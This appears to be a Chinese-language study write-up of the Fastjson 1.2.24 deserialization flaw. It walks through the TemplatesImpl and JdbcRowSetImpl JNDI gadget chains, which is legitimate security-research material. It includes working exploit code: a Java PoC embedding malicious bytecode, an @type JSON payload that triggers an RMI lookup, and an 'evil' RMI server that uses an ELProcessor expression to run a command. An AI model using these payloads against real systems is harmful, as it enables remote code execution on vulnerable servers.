---
title: Fastjson1.2.24漏洞分析
date: 2026-09-04
---

# Fastjson1.2.24漏洞分析

## 环境配置

导入需要的依赖：

```xml
<dependency>
    <groupId>com.unboundid</groupId>
    <artifactId>unboundid-ldapsdk</artifactId>
    <version>4.0.9</version>
</dependency>
<dependency>
    <groupId>commons-io</groupId>
    <artifactId>commons-io</artifactId>
    <version>2.5</version>
</dependency>
<dependency>
    <groupId>com.alibaba</groupId>
    <artifactId>fastjson</artifactId>
    <version>1.2.24</version>
</dependency>
<dependency>
    <groupId>commons-codec</groupId>
    <artifactId>commons-codec</artifactId>
    <version>1.12</version>
</dependency>
```

主要有两条攻击的链子，一条基于`TemplatesImpl`，一条基于`JdbcRowSetImpl`。

## 基于 TemplatesImpl 的利用链

poc 就是把恶意代码放到一个 json 格式的字符串里面，开头接`@type`，这里我们不需要通过反射来修改值，而是可以直接赋值。

`@type`之后是我们要进行反序列化的类，会获取它的构造方法、`getter`、`setter`方法。所以我们首先要找到这个反序列化类的构造函数、`getter`、`setter`有问题的地方。

### 利用链分析

这里利用的是之前学习 CC 链的时候有一条链子使用了`TemplatesImpl`来加载字节码，它的漏洞点在于调用了`newInstance()`方法，再去看这里，发现漏洞点的地方其实就是一个`getter`方法。

![1](https://drun1baby.top/2022/08/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Fastjson%E7%AF%8702-Fastjson-1-2-24%E7%89%88%E6%9C%AC%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/TemplatesImplGetter.png)

所以`TemplatesImpl`是满足我们 Fastjson 漏洞的利用条件的，在构造 EXP 前，先分析一下需要的参数。

#### 参数分析

这一步其实和当时 CC3 链很像，之前是通过反射进行修改，现在是直接放到 json 字符串里就可以了。

 先看`TemplatesImpl`类中的`getTransletInstance()`方法，这里直接参考 CC3 链的构造。

![2](https://drun1baby.top/2022/08/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Fastjson%E7%AF%8702-Fastjson-1-2-24%E7%89%88%E6%9C%AC%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/getTransletInstance.png)

`_name`不能为`null`，需要`_class`为`null`，这样就可以进入到`defineTransletClasses()`这个方法里，所以`_class`可以不用写，`_tfactory`也不能为空，`_bytecodes`是恶意字节码。

但是这个`getter`并不满足调用对应`getter`的条件，所以还需要去找合适的方法。

#### 解决问题

从`getTransletInstance()`开始去找谁调用了这个方法，只有`newTransformer()`调用了它，但是这个方法并不符合条件，所以还需要向上查找。然后就来到了`getOutputProperties()`方法。

![3](https://drun1baby.top/2022/08/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Fastjson%E7%AF%8702-Fastjson-1-2-24%E7%89%88%E6%9C%AC%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/getOutputProperties.png)

大致的链子是这样的：

```text
getOutputProperties()  ---> newTransformer() ---> TransformerImpl(getTransletInstance(), _outputProperties,  
 _indentNumber, _tfactory);
```

### 构造 EXP

我们在反序列化的时候参数需要加上`Object.class`与`Feature.SupportNonPublicField`。

```java
package org.example;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.Feature;
import com.alibaba.fastjson.parser.ParserConfig;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import org.apache.commons.codec.binary.Base64;
import org.apache.commons.io.IOUtils;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;

public class TemplatesImplPOC {

    public static String readClass(String cls){
        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        try {
            IOUtils.copy(new FileInputStream(new File(cls)),bos);
        } catch (IOException e) {
            throw new RuntimeException(e);
        }
        return Base64.encodeBase64String(bos.toByteArray());
    }

    public static void main(String[] args) {
        try {
            ParserConfig config = new ParserConfig();
            final String fileSeparator = System.getProperty("file.separator");
            final String evilClassPath = "D:\\JavaSecTestCode\\Calc.class";
            String evilCode = readClass(evilClassPath);
            final String NASTY_CLASS = "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl";
            String text1 = "{\"@type\":\""+NASTY_CLASS+"\",\"_bytecodes\":[\""+evilCode+"\"],'_name':'solo','_tfactory':{ },\"_outputProperties\":{ }}";

            Object obj = JSON.parseObject(text1, Object.class, config, Feature.SupportNonPublicField);
            //Object obj = JSON.parse(text1, Feature.SupportNonPublicField);  
        } catch (Exception e) {
            throw new RuntimeException(e);
        }
    }
}
```

## 基于 JdbcRowSetImpl 的利用链

> 简单来说就是利用了 JNDI 注入，这是平常用的最多的攻击方式。

基于 JdbcRowSetImpl 的利用链主要有两种利用方式，即 JNDI+RMI 和 JNDI+LDAP，都是基于 Bean Property 类型的 JNDI 的利用方式。

这一条链子名为`JdbcRowSetImpl`，所以我们先进到这个类里面进去。`JdbcRowSetImpl`类里面有一个 `setDataSourceName()` 方法，一看方法名就知道是什么意思了。设置数据库源，我们通过这个方式攻击。

EXP：

```json
{
	"@type":"com.sun.rowset.JdbcRowSetImpl",
	"dataSourceName":"rmi://localhost:1099/Exploit", "autoCommit":true
}
```

这里我就用https://github.com/cckuailong/JNDI-Injection-Exploit-Plus这个工具在本地来起一个恶意的 Server，也可以放到云服务器上。

这里来分析一下这个利用链。

找到`com.sun.rowset.JdbcRowSetImpl`这个类，先看一下这个类的无参构造方法：

```java
public JdbcRowSetImpl() {
    this.conn = null;
    this.ps = null;
    this.rs = null;
	...
}
```

重点是`conn`默认为`null`，这在后面的漏洞触发点是比较重要的。

然后看`setAutoCommit`方法：

```java
public void setAutoCommit(boolean var1) throws SQLException {
    if (this.conn != null) {
        this.conn.setAutoCommit(var1);
    } else {
        this.conn = this.connect();
        this.conn.setAutoCommit(var1);
    }

}
```

再看一下我们的 payload 有一个`"autoCommit":true`。根据 Fastjson 处理 json 数据的原理，就会调用`setAutoCommit`并且`var1`就是`true`。

由于无参构造里默认`conn`是`null`，所以我们就会走到 else 的分支里，从而调用这个类内部的`connect()`方法。

```java
private Connection connect() throws SQLException {
    if (this.conn != null) {
        return this.conn;
    } else if (this.getDataSourceName() != null) {
        try {
            InitialContext var1 = new InitialContext();
            DataSource var2 = (DataSource)var1.lookup(this.getDataSourceName());
            return this.getUsername() != null && !this.getUsername().equals("") ? var2.getConnection(this.getUsername(), this.getPassword()) : var2.getConnection();
        } catch (NamingException var3) {
            throw new SQLException(this.resBundle.handleGetObject("jdbcrowsetimpl.connect").toString());
        }
    } else {
        return this.getUrl() != null ? DriverManager.getConnection(this.getUrl(), this.getUsername(), this.getPassword()) : null;
    }
}
```

这里就有很明显的 JNDI 的调用了，而且`lookup()`的参数是我们可控的。由于我们传了`dataSourceName`这个参数，所以会调用对应的`setter`：

```java
public void setDataSourceName(String var1) throws SQLException {
    if (this.getDataSourceName() != null) {
        if (!this.getDataSourceName().equals(var1)) {
            super.setDataSourceName(var1);
            this.conn = null;
            this.ps = null;
            this.rs = null;
        }
    } else {
        super.setDataSourceName(var1);
    }

}
```

而`this.getDataSourceName()`得到的就是`null`，所以会走 else 分支。在`connect()`调用的`getDataSourceName()`获取的就是我们传入的数据，所以就会去`lookup()`我们的恶意 RMI 服务。

这条利用链也可以用 LDAP 来打，具体的 payload 只要换一下协议就可以了，原理是类似的。

## JDK 高版本绕过

jdk8u191 之后的版本就是用 LDAP 的绕过方式来打，EXP 其实并没有变，恶意 LDAP 服务发生了点变化。

```java
package org.example;

import com.sun.jndi.rmi.registry.ReferenceWrapper;
import org.apache.naming.ResourceRef;

import javax.naming.StringRefAddr;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

// JNDI 高版本 jdk 绕过服务端，用 bind 的方式
public class JNDIBypassHighJavaServerEL {
    public static void main(String[] args) throws Exception {
        System.out.println("[*]Evil RMI Server is Listening on port: 1099");
        Registry registry = LocateRegistry.createRegistry(1099);

        // 实例化Reference，指定目标类为javax.el.ELProcessor，工厂类为org.apache.naming.factory.BeanFactory
        ResourceRef ref = new ResourceRef("javax.el.ELProcessor", null, "", "",
                true,"org.apache.naming.factory.BeanFactory",null);

        // 强制将'x'属性的setter从'setX'变为'eval', 详细逻辑见BeanFactory.getObjectInstance代码
        ref.add(new StringRefAddr("forceString", "x=eval"));

        // 利用表达式执行命令
        ref.add(new StringRefAddr("x", "\"\".getClass().forName(\"javax.script.ScriptEngineManager\")" +
                ".newInstance().getEngineByName(\"JavaScript\")" +
                ".eval(\"new java.lang.ProcessBuilder['(java.lang.String[])'](['calc']).start()\")"));
        System.out.println("[*]Evil command: calc");
        ReferenceWrapper referenceWrapper = new ReferenceWrapper(ref);
        registry.bind("Object", referenceWrapper);
    }
}
```

## 总结

总结一下两种攻击方式，TemplatesImpl 是有一点限制的，需要对方的代码里面能够让我们加载的私有的 getter/setter，也就是需要这个参数 `Feature.SupportNonPublicField`。

第二种攻击方式，需要针对 jdk 版本，不过平常攻击肯定是第二种用的比较多。

















